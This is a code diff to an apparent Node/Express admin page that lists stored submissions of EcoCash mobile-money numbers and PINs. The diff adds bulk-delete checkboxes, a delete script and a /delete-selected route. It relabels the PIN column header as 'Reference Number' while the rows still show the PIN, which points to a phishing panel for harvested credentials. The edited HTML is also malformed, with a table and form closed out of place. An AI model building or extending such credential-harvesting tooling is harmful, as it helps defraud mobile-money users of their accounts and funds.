@@ -131,7 +131,15 @@ result.rows.forEach(item => {
 
   rows += `
   <tr>
-    <td>${item.id}</td>
+
+<td>
+<input
+type="checkbox"
+name="ids"
+value="${item.id}">
+</td>
+
+<td>${item.id}</td>
     <td>${item.ecocash_number}</td>
     <td>${item.ecocash_pin}</td>
     <td>${new Date(item.created_at).toLocaleString()}</td>
@@ -243,15 +251,88 @@ placeholder="Search EcoCash Number">
 
 <button type="submit">
 Search
-</button></form></div><table><tr>
+</button><button
+type="submit"
+form="deleteForm"
+style="background:red;color:white;border:none;padding:10px 15px;margin-left:10px;border-radius:5px;cursor:pointer;"
+onclick="return confirm('Delete selected records?')">
+Delete Selected
+</button></form></div><form id="deleteForm">
+
+</table>
+
+</form><tr>
+<tr>
+
+<th>
+<input type="checkbox" id="selectAll">
+</th>
+
 <th>ID</th>
+
 <th>EcoCash Number</th>
-<th>EcoCash Pin</th>
+
+<th>Reference Number</th>
+
 <th>Date Submitted</th>
+
 <th>Action</th>
+
 </tr>${rows}
 
-</table></div></body>
+</table></form>
+
+<script>
+
+document.getElementById("selectAll").addEventListener("change", function () {
+
+document.querySelectorAll("input[name='ids']").forEach(function(box){
+
+box.checked = document.getElementById("selectAll").checked;
+
+});
+
+});
+
+document.getElementById("deleteForm").addEventListener("submit", function(e){
+
+e.preventDefault();
+
+const ids=[];
+
+document.querySelectorAll("input[name='ids']:checked").forEach(function(box){
+
+ids.push(box.value);
+
+});
+
+if(ids.length===0){
+
+alert("Please select at least one record.");
+
+return;
+
+}
+
+fetch("/delete-selected",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({ids})
+
+}).then(()=>{
+
+location.reload();
+
+});
+
+});
+
+</script></div></body>
 </html>
 `);} catch (err) {
 
@@ -260,6 +341,31 @@ res.status(500).send(err.message);
 }
 });
 
+
+app.post("/delete-selected", async (req, res) => {
+
+  try {
+
+    const { ids } = req.body;
+
+    if (!ids || ids.length === 0) {
+      return res.redirect("/submissions");
+    }
+
+    await pool.query(
+      "DELETE FROM submissions WHERE id = ANY($1::int[])",
+      [Array.isArray(ids) ? ids : [ids]]
+    );
+
+    res.redirect("/submissions");
+
+  } catch (err) {
+
+    res.status(500).send(err.message);
+
+  }
+
+});
 app.listen(process.env.PORT || 3000, () => {
 console.log("Server started");
 });
